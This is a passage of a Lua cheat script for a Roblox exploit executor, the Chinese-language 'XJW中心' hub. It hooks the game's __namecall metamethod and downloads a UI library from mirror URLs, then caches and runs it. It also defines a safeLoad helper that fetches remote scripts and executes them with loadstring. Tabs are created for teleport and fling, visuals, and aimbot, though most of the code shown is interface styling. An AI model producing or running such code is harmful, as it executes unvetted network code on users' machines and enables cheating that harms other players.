local ok,res=pcall(req,{Url=url,Method="GET",Timeout=sec or 8})
if ok and type(res)=="table" and (res.StatusCode==200 or res.StatusCode==nil) and type(res.Body)=="string" and #res.Body>200 then
return res.Body
end
end
local ok,body=pcall(function() return game:HttpGet(url,true) end)
if ok and type(body)=="string" and #body>200 then return body end
ok,body=pcall(function()
return game:GetService("HttpService"):GetAsync(url)
end)
if ok and type(body)=="string" and #body>200 then return body end
return nil
end
local function dropBadCache()
pcall(function()
local genv=envTable()
local d=genv.delfile
if type(d)=="function" and type(isfile)=="function" and isfile(XJWUI_CACHE) then
d(XJWUI_CACHE)
end
end)
end
local function loadXJWUI()
if canRead() then
for _,path in ipairs({XJWUI_CACHE,"UIKu/"..XJWUI_NAME}) do
if isfile(path) then
local ok,src=pcall(readfile,path)
if ok then
local lib=tryLib(src)
if lib then return lib end
end
end
end
dropBadCache()
end
local total=#XJWUI_MIRRORS
local tStart=os.clock()
for i=1,total do
if os.clock()-tStart>40 then break end
local root=XJWUI_MIRRORS[i]
__XJW_LBL("正在获取界面库 "..i.."/"..total)
local src=timedGet(root..XJWUI_NAME,8)
if src then
local lib=tryLib(src)
if lib then
if canWrite() then pcall(writefile,XJWUI_CACHE,src) end
return lib
end
end
end
__XJW_LBL("界面库获取失败")
return nil
end
_G.__XJW_LIB_READY=false
bootTip("正在加载界面库…(首次较慢)",5)
__XJW_LBL("下载界面库")
task.delay(45,function()
if _G.__XJW_LIB_READY~=true and _G.__XJW_LIB_FAILED~=true then
_G.__XJW_LIB_FAILED=true
pcall(function()
__XJW_BOOT.fail("界面库加载超时")
end)
bootTip("界面库加载超时，请重试",8)
end
end)
local Library=loadXJWUI()
__XJW_LBL("库已加载")
task.wait()
if type(Library) ~= "table" or Library.CreateWindow == nil or Library.CreateLoading == nil then
_G.__XJW_LIB_FAILED=true
pcall(function()
__XJW_BOOT.fail("界面库加载失败：所有线路均不可用")
end)
bootTip("界面库加载失败，请换个网络或重开执行器重试",8)
return
end
_G.__XJW_LIB_READY=true
__XJW_LBL("库对象就绪")
__XJW_LBL("库校验通过")
Library.ForceCheckbox=true
local function guardPrimaryPartCFrame()
if type(hookmetamethod) ~= "function" or type(getnamecallmethod) ~= "function" then return end
pcall(function()
if type(getgenv) == "function" then
local env=getgenv()
if type(env) == "table" then
if env.__revPPCFGuard then return end
env.__revPPCFGuard=true
end
end
local oldNamecall
local function hookFn(self,...)
if getnamecallmethod() == "SetPrimaryPartCFrame" then
local isModel=false
pcall(function() isModel=self:IsA("Model") end)
if isModel then
local hasPart=false
pcall(function() hasPart=self.PrimaryPart ~= nil end)
local hasHum=false
pcall(function() hasHum=self:FindFirstChildOfClass("Humanoid")~=nil end)
if not hasPart and not hasHum then
local cf=select(1,...)
if typeof(cf)=="CFrame" then
pcall(function() self:PivotTo(cf) end)
return self
end
end
end
end
if type(oldNamecall) ~= "function" then return end
return oldNamecall(self,...)
end
if type(newcclosure) == "function" then
local okWrap,wrapped=pcall(newcclosure,hookFn)
if okWrap and type(wrapped) == "function" then hookFn=wrapped end
end
oldNamecall=hookmetamethod(game,"__namecall",hookFn)
end)
end
if _G.__XJW_GUARD==true then
pcall(guardPrimaryPartCFrame)
end
local ThemeManager=Library.ThemeManager
local SaveManager=Library.SaveManager
local BACKGROUND_IMAGE="https://raw.githubusercontent.com/jiuyijiuyijiuyi91/XJW666/refs/heads/main/XJW%E8%84%9A%E6%9C%AC%E5%A3%81%E7%BA%B8.png"
local BOOT
do
local TS=game:GetService("TweenService")
local PlayerGui=LocalPlayer:WaitForChild("PlayerGui")
BOOT={
styleKey=nil,
picked=false,
uiReady=false,
awaiting=false,
finished=false,
apply=nil,
dropdown=nil,
}
local function hideAllFloats()
pcall(function()
local ui=Library and Library.XJWUI
if not ui then return end
ui.FloatStyle="off"
if ui.FloatGui then
pcall(function() ui.FloatGui:Destroy() end)
ui.FloatGui=nil
end
if ui.FloatScreen then
pcall(function() ui.FloatScreen:Destroy() end)
ui.FloatScreen=nil
end
end)
pcall(function()
local holder=Library and Library.Floats
if not holder then return end
local list=holder:GetDescendants()
if type(list) ~= "table" then return end
for _,item in ipairs(list) do
if item:IsA("GuiObject") then
item.Visible=false
end
end
end)
end
BOOT.hideFloats=hideAllFloats
hideAllFloats()
task.spawn(function()
for _=1,40 do
if BOOT and BOOT.finished then break end
hideAllFloats()
task.wait(0.5)
end
end)
local function showMain()
if type(Library) == "table" and Library.Toggled == true then
return
end
local win=BOOT.window
if type(win) == "table" and type(win.Toggle) == "function" then
pcall(function()
win:Toggle(true)
end)
return
end
if type(Library) == "table" and type(Library.Toggle) == "function" then
pcall(function()
Library:Toggle(true)
end)
end
end
end
local __XJW_FETCH
local Notify
local getCharacter
local __XJW_TAG="远程脚本"
local function safeLoad(url)
local content=__XJW_FETCH and __XJW_FETCH(url)
if not content or#content<24 then
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="加载失败",Text=tostring(__XJW_TAG).." 全部线路不可用",Duration=5})
end)
return false
end
local fn=loadstring(content)
if not fn then
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="代码错误",Text=tostring(__XJW_TAG).." 无法编译",Duration=5})
end)
return false
end
local ok,e=pcall(fn)
if not ok then
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title="运行错误",Text=tostring(__XJW_TAG).." "..tostring(e):sub(1,90),Duration=6})
end)
return false
end
return true
end
local HttpService=game:GetService("HttpService")
local _lastUpdate="2026年11月20日10时53分"
__XJW_LBL("建窗口中")
task.wait()
local Window=Library:CreateWindow({
Title="XJW中心",
Footer="感谢支持",
Icon=nil,
CornerRadius=10,
SidebarCompacted=false,
EnableCompacting=false,
MinSidebarWidth=168,
NotifySide="Right",
ShowCustomCursor=false,
Resizable=true,
Center=true,
AutoShow=false,
Animations={
ToggleWindow=false,
TabSwitch=true,
Groupbox=true,
Dropdown=true,
KeyPicker=true,
},
})
__XJW_LBL("窗口已创建")
task.wait()
BOOT.window=Window
_G.__XJW_WIN=Window
BOOT.showWindow=function()
if Window and type(Window.Toggle) == "function" then
Window:Toggle(true)
end
end
if BOOT.goldDone then
BOOT.wantShow=false
task.defer(function()
pcall(BOOT.showWindow)
end)
else
BOOT.wantShow=false
if Window and type(Window.Toggle) == "function" then
pcall(function()
Window:Toggle(false)
end)
end
end
Library.ShowCustomCursor=false
if type(Library.Animations) == "table" then
Library.Animations.ToggleWindow=false
end
task.delay(0.6,function()
if type(Library.Toggles) ~= "table" then return end
for _,t in pairs(Library.Toggles) do
if type(t) == "table" and type(t.Display) == "function" then
pcall(function() t:Display() end)
end
end
end)
local rawNotify=Library.Notify
Library.Notify=function(a,b)
if Library.Unloaded then return end
if type(b) == "table" then
local title=tostring(b.Title or "")
if title == "" then title="XJW中心" end
return rawNotify(a,{
Title=title,
Description=tostring(b.Content or b.Description or ""),
Time=b.Time or b.Duration or 4,
SoundId=106145041472451,
Volume=1,
})
end
return rawNotify(a,{
Title="XJW中心",
Description=tostring(b or ""),
Time=4,
SoundId=106145041472451,
Volume=1,
})
end
local function hideAllFloats()
pcall(function()
local ui=Library and Library.XJWUI
if not ui then return end
ui.FloatStyle="off"
if ui.FloatGui then
pcall(function()ui.FloatGui:Destroy()end)
ui.FloatGui=nil
end
if ui.FloatScreen then
pcall(function()ui.FloatScreen:Destroy()end)
ui.FloatScreen=nil
end
end)
pcall(function()
local holder=Library and Library.Floats
if not holder then return end
local list=holder:GetDescendants()
if type(list)~="table"then return end
for _,item in ipairs(list)do
if item:IsA("GuiObject")then
item.Visible=false
end
end
end)
end
BOOT.hideFloats=hideAllFloats
hideAllFloats()
task.spawn(function()
for _=1,60 do
if BOOT and BOOT.finished then break end
if not(BOOT and BOOT.hideFloats)then hideAllFloats()end
task.wait(0.25)
end
end)
local BACKGROUND_IMAGE="https://cdn.jsdelivr.net/gh/jiuyijiuyijiuyi91/XJW666@main/XJW%E8%84%9A%E6%9C%AC%E5%A3%81%E7%BA%B8.png"
local BACKGROUND_SCALE_MODE=Enum.ScaleType.Crop
local BACKGROUND_IMAGE_TRANSPARENCY=0.75
local __R={q={},ready=false,at=nil,shown=false}
__R.on=function(fn)
if type(fn)~="function"then return end
if __R.ready then
task.spawn(function()pcall(fn)end)
return
end
table.insert(__R.q,fn)
end
__R.run=function()
if __R.ready then return end
__R.ready=true
__R.at=tick()
local list=__R.q
__R.q={}
task.spawn(function()
local __bt=os.clock()
for _,fn in ipairs(list)do
if Library and Library.Unloaded then return end
pcall(fn)
local __bn=os.clock()
if __bn-__bt>=0.06 then __bt=__bn task.wait() end
end
end)
end
__R.iq={}
__R.img=function(fn)
if type(fn)~="function"then return end
if __R.imgDone then
task.spawn(function()pcall(fn)end)
return
end
table.insert(__R.iq,fn)
end
__R.imgRun=function()
if __R.imgDone then return end
__R.imgDone=true
local list=__R.iq
__R.iq={}
task.spawn(function()
local __bt=os.clock()
for _,fn in ipairs(list)do
if Library and Library.Unloaded then return end
pcall(fn)
local __bn=os.clock()
if __bn-__bt>=0.06 then __bt=__bn task.wait() end
end
end)
end
local function fixBackgroundAspect()
local gui=Library and Library.ScreenGui
if not gui then return end
local ok,children=pcall(function()return gui:GetChildren()end)
if not ok or type(children)~="table"then return end
for _,obj in ipairs(children)do
pcall(function()
if not obj:IsA("ImageLabel")then return end
if obj.Image==""or obj.BackgroundTransparency~=1 then return end
if obj.Parent~=gui then return end
if not obj:FindFirstChildOfClass("UICorner")then return end
if obj.ScaleType~=BACKGROUND_SCALE_MODE then
obj.ScaleType=BACKGROUND_SCALE_MODE
end
if math.abs(obj.ImageTransparency-BACKGROUND_IMAGE_TRANSPARENCY)>0.01 then
obj.ImageTransparency=BACKGROUND_IMAGE_TRANSPARENCY
end
end)
end
end
__R.imgSetup=function()
if __R.bgDone then return end
__R.bgDone=true
if Library and type(Library.SetBackgroundImage)=="function"then
pcall(function()
Library:SetBackgroundImage(BACKGROUND_IMAGE)
end)
end
fixBackgroundAspect()
end
if Library and type(Library.SetBackgroundImage)=="function"then
local rawSetBackgroundImage=Library.SetBackgroundImage
Library.SetBackgroundImage=function(self,image)
local ok,res=pcall(rawSetBackgroundImage,self,image)
task.defer(fixBackgroundAspect)
if not ok then return nil end
return res
end
end
task.spawn(function()
while not __R.ready do
task.wait(0.1)
end
while true do
if Library and Library.Unloaded then return end
fixBackgroundAspect()
task.wait(1)
end
end)
pcall(function()
local bgGui=Library and Library.ScreenGui
if bgGui then
bgGui.ChildAdded:Connect(function()
if Library and Library.Unloaded then return end
task.defer(fixBackgroundAspect)
end)
end
end)
local function softenOuterBorder()
local gui=Library and Library.ScreenGui
if not gui then return end
local outline=(Library.Scheme and Library.Scheme.OutlineColor)or Color3.fromRGB(70,70,80)
local ok,list=pcall(function()
return gui:GetDescendants()
end)
if not ok or type(list)~="table"then return end
for _,obj in ipairs(list)do
pcall(function()
if obj:IsA("UIStroke")then
local parent=obj.Parent
local top=parent and parent.Parent
if top~=nil and top==gui then
obj.Color=outline
obj.Transparency=1
elseif obj.Thickness>1.2 and obj.Thickness<1.8 then
obj.Color=outline
obj.Thickness=1
if obj.Transparency<0.7 then obj.Transparency=0.7 end
end
end
end)
end
end
local SOFT_DIRTY=true
if type(Library.UpdateColorsUsingRegistry)=="function"then
local rawUpdateColors=Library.UpdateColorsUsingRegistry
Library.UpdateColorsUsingRegistry=function(self,...)
local res=rawUpdateColors(self,...)
SOFT_DIRTY=true
return res
end
end
task.spawn(function()
task.wait(0.5)
while true do
if Library and Library.Unloaded then return end
if SOFT_DIRTY then
SOFT_DIRTY=false
local t0=os.clock()
pcall(softenOuterBorder)
if os.clock()-t0>0.1 then task.wait() end
end
task.wait(0.5)
end
end)
local FLOAT_GLASS=Color3.fromRGB(255,255,255)
local FLOAT_EDGE_T=0.3
local FLOAT_EDGE_W=2.5
local function uiAccent()
local c
pcall(function()
c=Library and Library.Scheme and Library.Scheme.AccentColor
end)
if typeof(c)=="Color3"then
return c
end
return Color3.fromRGB(125,85,255)
end
local function tintColor(base,toward,amount)
local ok,res=pcall(function()
return base:Lerp(toward,amount)
end)
if ok and typeof(res)=="Color3"then
return res
end
return base
end
local function accentLight(base,amount)
return tintColor(base,Color3.new(1,1,1),amount)
end
local function accentDeep(base,amount)
return tintColor(base,Color3.new(0,0,0),amount)
end
local function accentSequence(base)
local h,s,v=Color3.toHSV(base)
local sat=math.clamp(math.max(s,0.72),0.72,1)
local val=math.clamp(v,0.62,1)
local function key(pos,dh,ds,dv)
return ColorSequenceKeypoint.new(pos,Color3.fromHSV(
(h+dh)%1,
math.clamp(sat+ds,0.4,1),
math.clamp(val+dv,0.22,1)
))
end
return ColorSequence.new({
key(0,-0.04,-0.18,0.34),
key(0.26,0,0,0.1),
key(0.52,0.035,0.06,-0.2),
key(0.78,0.012,-0.12,0.16),
key(1,-0.04,-0.18,0.34),
})
end
do
local WHITE=Color3.new(1,1,1)
local SPEED=62
local function findTitle()
local main=Window and Window.MainFrame
if not main then return nil end
local found
for _,obj in ipairs(main:GetDescendants())do
if obj:IsA("TextLabel")then
local txt=tostring(obj.Text)
if txt=="XJW中心"or string.find(txt,"XJW",1,true)~=nil then
found=obj
break
end
end
end
return found
end
local function installFX(label)
local grad=label:FindFirstChild("XJWTitleFlow")
if not(grad and grad:IsA("UIGradient"))then
if grad then
pcall(function()
grad:Destroy()
end)
end
grad=Instance.new("UIGradient")
grad.Name="XJWTitleFlow"
grad.Parent=label
end
grad.Color=accentSequence(uiAccent())
label.TextColor3=WHITE
return grad
end
task.spawn(function()
local label,grad,last
local t0=os.clock()
while true do
if not(label and label.Parent)then
label=findTitle()
grad=nil
end
if label then
local ok=pcall(function()
grad=installFX(label)
end)
if not ok then
grad=nil
end
last=uiAccent()
end
while label and label.Parent and grad do
local ok=pcall(function()
if label.TextColor3~=WHITE then
label.TextColor3=WHITE
end
local cur=uiAccent()
if cur~=last then
last=cur
grad.Color=accentSequence(cur)
end
local t=os.clock()-t0
grad.Rotation=(t*SPEED)%360
grad.Offset=Vector2.new(math.sin(t*1.15)*0.06,0)
end)
if not ok or grad.Parent~=label then
grad=nil
break
end
RunService.RenderStepped:Wait()
end
task.wait(0.2)
end
end)
end
local XJWFloat={}
do
local TS=game:GetService("TweenService")
local LABELS={bar="灵动岛",orb="悬浮窗",off="黑曜石悬浮窗"}
local KEYS={
["灵动岛"]="bar",
["横向灵动岛"]="bar",
["横向悬浮条"]="bar",
["悬浮窗"]="orb",
["可拖动浮球"]="orb",
["黑曜石悬浮窗"]="off",
["隐藏"]="off",
bar="bar",
orb="orb",
off="off",
}
local screen
local frame
local connections={}
local positions={}
local hidden={}
local watchTask
local state="bar"
local painters={}
local function repaint()
local base=uiAccent()
for _,fn in ipairs(painters)do
pcall(fn,base)
end
end
local function detach()
painters={}
for _,conn in ipairs(connections)do
pcall(function()
conn:Disconnect()
end)
end
connections={}
if frame then
pcall(function()
frame:Destroy()
end)
frame=nil
end
end
local function guiParent()
local parent
pcall(function()
if type(gethui)=="function"then
parent=gethui()
end
end)
if not parent then
pcall(function()
parent=LocalPlayer:WaitForChild("PlayerGui",5)
end)
end
if not parent then
pcall(function()
parent=game:GetService("CoreGui")
end)
end
return parent
end
local function ensureScreen()
if screen and screen.Parent then
return screen
end
local parent=guiParent()
if not parent then
return nil
end
local gui=Instance.new("ScreenGui")
gui.Name="XJWFloatGui"
gui.ResetOnSpawn=false
gui.IgnoreGuiInset=true
gui.DisplayOrder=999999
gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
gui.Parent=parent
screen=gui
return gui
end
local function accentStroke(target)
local stroke=Instance.new("UIStroke")
stroke.Color=FLOAT_GLASS
stroke.Thickness=FLOAT_EDGE_W
stroke.Transparency=FLOAT_EDGE_T
stroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
stroke.Parent=target
table.insert(painters,function(base)
stroke.Color=accentLight(base,0.1)
end)
return stroke
end
local function bind(signal,handler)
table.insert(connections,signal:Connect(handler))
end
local function toggleWindow()
pcall(function()
if type(Library.Toggle)=="function"then
Library:Toggle()
elseif Library.ScreenGui then
Library.ScreenGui.Enabled=not Library.ScreenGui.Enabled
end
end)
end
local function pressFX(target)
local scale=target:FindFirstChildOfClass("UIScale")
if not scale then
scale=Instance.new("UIScale")
scale.Parent=target
end
local function play(to,dur,style)
pcall(function()
TS:Create(scale,TweenInfo.new(dur,style,Enum.EasingDirection.Out),{Scale=to}):Play()
end)
end
return{
push=function()
play(0.88,0.1,Enum.EasingStyle.Quad)
end,
release=function()
play(1,0.22,Enum.EasingStyle.Back)
end,
}
end
local function makeDraggable(target,styleKey,onClick,fx)
local press,startOffset,dragging,moved
bind(target.InputBegan,function(input)
if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
dragging=true
moved=false
press=input.Position
startOffset=Vector2.new(target.Position.X.Offset,target.Position.Y.Offset)
if fx then pcall(fx.push)end
end
end)
bind(UIS.InputChanged,function(input)
if not dragging or not press then
return
end
if input.UserInputType~=Enum.UserInputType.MouseMovement and input.UserInputType~=Enum.UserInputType.Touch then
return
end
local delta=input.Position-press
if delta.Magnitude>6 then
moved=true
end
if moved then
target.Position=UDim2.new(target.Position.X.Scale,startOffset.X+delta.X,target.Position.Y.Scale,startOffset.Y+delta.Y)
end
end)
bind(UIS.InputEnded,function(input)
if input.UserInputType~=Enum.UserInputType.MouseButton1 and input.UserInputType~=Enum.UserInputType.Touch then
return
end
if not dragging then
return
end
dragging=false
press=nil
positions[styleKey]=target.Position
if fx then pcall(fx.release)end
if not moved and onClick then
pcall(onClick)
end
end)
end
local NATIVE_TEXT={
Toggle=true,
Lock=true,
Unlock=true,
["切换"]=true,
["锁定"]=true,
["解锁"]=true,
}
local function nativeButtons()
local result={}
local seen={}
local floats=Library and Library.Floats
if not(floats and typeof(floats)=="Instance"and floats.Parent)then
return result
end
local function push(item)
if item and not seen[item]and item:IsA("TextButton")then
seen[item]=true
table.insert(result,item)
end
end
local ok,children=pcall(function()
return floats:GetChildren()
end)
if ok and type(children)=="table"then
for _,item in ipairs(children)do
if item:IsA("TextButton")then
push(item)
end
end
end
local ok2,descendants=pcall(function()
return floats:GetDescendants()
end)
if ok2 and type(descendants)=="table"then
for _,item in ipairs(descendants)do
if item:IsA("TextButton")then
local txt=tostring(item.Text)
if NATIVE_TEXT[txt]or item.Name=="Toggle"or item.Name=="Lock"then
push(item)
end
end
end
end
return result
end
local function showNative(show)
for _,button in ipairs(nativeButtons())do
if show then
pcall(function()
button.Visible=true
end)
elseif button.Visible then
pcall(function()
button.Visible=false
end)
end
end
end
local function hideNative()
showNative(false)
end
local function restoreNative()
showNative(true)
hidden={}
end
local function startWatchdog()
if watchTask then return end
watchTask=task.spawn(function()
while state=="bar"or state=="orb"do
pcall(hideNative)
task.wait(0.35)
end
watchTask=nil
end)
end
local function buildOrb(holder)
local orb=Instance.new("Frame")
orb.Name="XJWFloatOrb"
orb.AnchorPoint=Vector2.new(0.5,0.5)
orb.Position=positions.orb or UDim2.new(0,56,0.5,0)
orb.Size=UDim2.fromOffset(64,64)
orb.BackgroundColor3=FLOAT_GLASS
orb.BackgroundTransparency=1
orb.BorderSizePixel=0
orb.ClipsDescendants=true
orb.ZIndex=61
orb.Active=true
local corner=Instance.new("UICorner")
corner.CornerRadius=UDim.new(1,0)
corner.Parent=orb
accentStroke(orb)
local brand=Instance.new("TextLabel")
brand.BackgroundTransparency=1
brand.Size=UDim2.fromScale(1,1)
brand.Font=Enum.Font.GothamBold
brand.Text="XJW"
brand.TextSize=15
brand.TextStrokeTransparency=1
brand.TextColor3=Color3.fromRGB(255,255,255)
brand.ZIndex=64
brand.Parent=orb
orb.Parent=holder
makeDraggable(orb,"orb",toggleWindow,pressFX(orb))
return orb
end
local function buildIsland(holder)
local W_SMALL=126
local W_BIG=178
local H=36
local TOP_Y=10
local bar=Instance.new("Frame")
bar.Name="XJWFloatIsland"
bar.AnchorPoint=Vector2.new(0.5,0)
bar.Position=positions.bar or UDim2.new(0.5,0,0,TOP_Y)
bar.Size=UDim2.fromOffset(W_SMALL,H)
bar.BackgroundColor3=FLOAT_GLASS
bar.BackgroundTransparency=1
bar.BorderSizePixel=0
bar.ClipsDescendants=true
bar.ZIndex=61
bar.Active=true
local corner=Instance.new("UICorner")
corner.CornerRadius=UDim.new(1,0)
corner.Parent=bar
local stroke=Instance.new("UIStroke")
stroke.Thickness=2.5
stroke.Transparency=0.3
stroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
stroke.Parent=bar
table.insert(painters,function(base)
stroke.Color=accentLight(base,0.1)
end)
local glow=Instance.new("Frame")
glow.Name="Dot"
glow.AnchorPoint=Vector2.new(0,0.5)
glow.Position=UDim2.new(0,13,0.5,0)
glow.Size=UDim2.fromOffset(7,7)
glow.BackgroundColor3=FLOAT_GLASS
glow.BorderSizePixel=0
glow.ZIndex=64
glow.Parent=bar
table.insert(painters,function(base)
glow.BackgroundColor3=base
end)
local glowCorner=Instance.new("UICorner")
glowCorner.CornerRadius=UDim.new(1,0)
glowCorner.Parent=glow
local halo=Instance.new("UIStroke")
halo.Thickness=1
halo.Transparency=0.7
halo.Parent=glow
table.insert(painters,function(base)
halo.Color=base
end)
local brand=Instance.new("TextLabel")
brand.BackgroundTransparency=1
brand.Position=UDim2.fromOffset(26,0)
brand.Size=UDim2.fromOffset(54,H)
brand.Font=Enum.Font.GothamBold
brand.Text="XJW"
brand.TextSize=14
brand.TextStrokeTransparency=1
brand.TextColor3=Color3.fromRGB(255,255,255)
brand.TextXAlignment=Enum.TextXAlignment.Left
brand.ZIndex=64
brand.Parent=bar
local hint=Instance.new("TextLabel")
hint.BackgroundTransparency=1
hint.Position=UDim2.fromOffset(82,0)
hint.Size=UDim2.new(1,-126,1,0)
hint.Font=Enum.Font.GothamMedium
hint.Text="展开"
hint.TextSize=12
hint.TextColor3=Color3.fromRGB(255,255,255)
hint.TextTransparency=1
hint.TextXAlignment=Enum.TextXAlignment.Left
hint.ZIndex=64
hint.Parent=bar
local lens=Instance.new("Frame")
lens.Name="Lens"
lens.AnchorPoint=Vector2.new(1,0.5)
lens.Position=UDim2.new(1,-12,0.5,0)
lens.Size=UDim2.fromOffset(14,14)
lens.BackgroundColor3=Color3.fromRGB(20,20,24)
lens.BackgroundTransparency=0.2
lens.BorderSizePixel=0
lens.ZIndex=65
lens.Parent=bar
local lensCorner=Instance.new("UICorner")
lensCorner.CornerRadius=UDim.new(1,0)
lensCorner.Parent=lens
local lensRing=Instance.new("UIStroke")
lensRing.Thickness=1
lensRing.Transparency=0.6
lensRing.Parent=lens
table.insert(painters,function(base)
lensRing.Color=accentDeep(base,0.45)
end)
local lensDot=Instance.new("Frame")
lensDot.AnchorPoint=Vector2.new(0.5,0.5)
lensDot.Position=UDim2.fromScale(0.5,0.5)
lensDot.Size=UDim2.fromOffset(7,7)
lensDot.BackgroundColor3=Color3.fromRGB(3,3,5)
lensDot.BackgroundTransparency=0.1
lensDot.BorderSizePixel=0
lensDot.ZIndex=66
lensDot.Parent=lens
local lensDotCorner=Instance.new("UICorner")
lensDotCorner.CornerRadius=UDim.new(1,0)
lensDotCorner.Parent=lensDot
local lensShine=Instance.new("UIStroke")
lensShine.Thickness=1
lensShine.Transparency=0.5
lensShine.Parent=lensDot
table.insert(painters,function(base)
lensShine.Color=accentDeep(base,0.3)
end)
bar.Parent=holder
local function resize(width,duration)
pcall(function()
TS:Create(bar,TweenInfo.new(duration,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{
Size=UDim2.fromOffset(width,H),
}):Play()
end)
end
local function showHint(visible)
pcall(function()
TS:Create(hint,TweenInfo.new(0.18,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{
TextTransparency=visible and 0.1 or 1,
}):Play()
end)
end
local open=false
local function syncState(opened)
if opened==open then
return
end
open=opened
if opened then
hint.Text="收起"
resize(W_BIG,0.32)
showHint(true)
else
hint.Text="展开"
resize(W_SMALL,0.28)
showHint(false)
end
end
task.spawn(function()
while bar.Parent do
local opened=false
pcall(function()
opened=Library.Toggled==true
end)
syncState(opened)
task.wait(0.18)
end
end)
task.spawn(function()
while bar.Parent do
local wave=(math.sin(os.clock()*3)+1)*0.5
pcall(function()
glow.BackgroundTransparency=wave*0.45
glow.Size=UDim2.fromOffset(7-wave*1.6,7-wave*1.6)
halo.Transparency=0.85-wave*0.4
end)
task.wait(0.05)
end
end)
local press,startX,dragging,moved
local fx=pressFX(bar)
bind(bar.InputBegan,function(input)
if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
dragging=true
moved=false
press=input.Position
startX=bar.Position.X.Offset
if fx then pcall(fx.push)end
end
end)
bind(UIS.InputChanged,function(input)
if not dragging or not press then
return
end
if input.UserInputType~=Enum.UserInputType.MouseMovement and input.UserInputType~=Enum.UserInputType.Touch then
return
end
local delta=input.Position-press
if delta.Magnitude>6 then
moved=true
end
if moved then
bar.Position=UDim2.new(0.5,startX+delta.X,0,TOP_Y)
end
end)
bind(UIS.InputEnded,function(input)
if input.UserInputType~=Enum.UserInputType.MouseButton1 and input.UserInputType~=Enum.UserInputType.Touch then
return
end
if not dragging then
return
end
dragging=false
press=nil
positions.bar=UDim2.new(0.5,bar.Position.X.Offset,0,TOP_Y)
if fx then pcall(fx.release)end
if not moved then
toggleWindow()
local opened=false
pcall(function()
opened=Library.Toggled==true
end)
syncState(opened)
end
end)
return bar
end
function XJWFloat.setStyle(value)
local key=KEYS[value]or state or "bar"
if key~="bar"and key~="orb"and key~="off"then
key="bar"
end
detach()
state=key
if key=="off"then
if type(Library.SetFloatStyle)=="function"then
pcall(function()
Library:SetFloatStyle("off")
end)
end
restoreNative()
return LABELS.off
end
local holder=ensureScreen()
if not holder then
return LABELS[key]or LABELS.bar
end
hideNative()
startWatchdog()
if key=="orb"then
frame=buildOrb(holder)
else
frame=buildIsland(holder)
end
repaint()
if frame then
task.spawn(function()
while frame and frame.Parent do
local last=uiAccent()
task.wait(0.4)
if frame and frame.Parent and uiAccent()~=last then
repaint()
end
end
end)
end
positions[key]=frame.Position
return LABELS[key]or LABELS.bar
end
function XJWFloat.label()
return LABELS[state]or LABELS.bar
end
function XJWFloat.destroy()
detach()
restoreNative()
if screen then
pcall(function()
screen:Destroy()
end)
screen=nil
end
end
if type(BOOT.hideFloats)=="function"then
pcall(BOOT.hideFloats)
end
BOOT.apply=function(label)
pcall(function()
XJWFloat.setStyle(label)
end)
local dd=BOOT.dropdown
if dd and type(dd.SetValue)=="function"then
pcall(function()dd:SetValue(label)end)
end
end
task.defer(function()
if not BOOT.styleKey then
if type(BOOT.hideFloats)=="function"then
pcall(BOOT.hideFloats)
end
return
end
pcall(function()
XJWFloat.setStyle(BOOT.styleKey)
end)
end)
if type(Library.OnUnload)=="function"then
pcall(function()
Library:OnUnload(function()
XJWFloat.destroy()
end)
end)
end
end
local rawNotify=Library.Notify
Library.Notify=function(a,b)
if Library.Unloaded then return end
if type(b) == "table" then
local title=tostring(b.Title or "")
if title == "" then title="XJW中心" end
return rawNotify(a,{
Title=title,
Description=tostring(b.Content or b.Description or ""),
Time=b.Time or b.Duration or 4,
SoundId=106145041472451,
Volume=1,
})
end
return rawNotify(a,{
Title="XJW中心",
Description=tostring(b or ""),
Time=4,
SoundId=106145041472451,
Volume=1,
})
end
if type(Library.EnableChinese)=="function"then
Library:EnableChinese(true)
end
if type(Library.InstallNotify)=="function"then
Library:InstallNotify("自制脚本")
end
if type(Library.InstallBackground)=="function"then
if __R and type(__R.img)=="function"then
__R.img(function()
pcall(function() Library:InstallBackground() end)
if type(__R.imgSetup)=="function"then
pcall(__R.imgSetup)
end
end)
else
pcall(function() Library:InstallBackground() end)
if type(__R.imgSetup)=="function"then
pcall(__R.imgSetup)
end
end
end
if type(Library.StyleSidebar)=="function"then
__R.on(function()
Library:StyleSidebar()
end)
end
__XJW_LBL("开始建页签")
local Tabs={
Announcement=Window:AddTab("公告","megaphone"),
ScriptInfo=Window:AddTab("玩家信息","info"),
Main=Window:AddTab("通用","user"),
TP=Window:AddTab("传送和甩飞","send"),
Visual=Window:AddTab("视觉","eye"),
Aim=Window:AddTab("自瞄","crosshair"),
Function=Window:AddTab("趣味功能","list"),
}
do
__R.shown=false
pcall(__R.run)
end
__XJW_LBL("页签已建,窗口待显示")
local function __XJW_NOTE(title,text)
pcall(function()
game.StarterGui:SetCore("SendNotification",{Title=tostring(title),Text=tostring(text):sub(1,120),Duration=4})
end)
end

local function __XJW_URLENC(u)
return (u:gsub("[^%w%-%._~:/%?%&%=%+%%%,;@%$!%*'%(%)%[%]]", function(c)
return string.format("%%%02X", string.byte(c))
end))
end

local __XJW_IO_OK=(type(isfile)=="function" and type(readfile)=="function" and type(writefile)=="function" and type(isfolder)=="function" and type(makefolder)=="function")

local function __XJW_HASH(s)
local h=5381
for i=1,#s do h=(h*33+s:byte(i))%4294967296 end
return string.format("%08x",h)
end

local function __XJW_CACHEP(url)
if not __XJW_IO_OK then return nil end
pcall(function()
if not isfolder("XJWLoadCache")then makefolder("XJWLoadCache")end
end)
return "XJWLoadCache/"..__XJW_HASH(url)..".lua"
end

local function __XJW_CREAD(url)
local p=__XJW_CACHEP(url)
if not p then return nil end
local ok,body=pcall(function()
if isfile(p)then return readfile(p)end
end)
if ok and type(body)=="string" and #body>24 then return body end
return nil
end

local function __XJW_CWRITE(url,body)
local p=__XJW_CACHEP(url)
if not p then return end
pcall(function() writefile(p,body) end)
end

local function __XJW_PREF_GET()
if _G.__XJW_MIRROR_PREF then return _G.__XJW_MIRROR_PREF end
if not __XJW_IO_OK then return nil end
local ok,v=pcall(function()
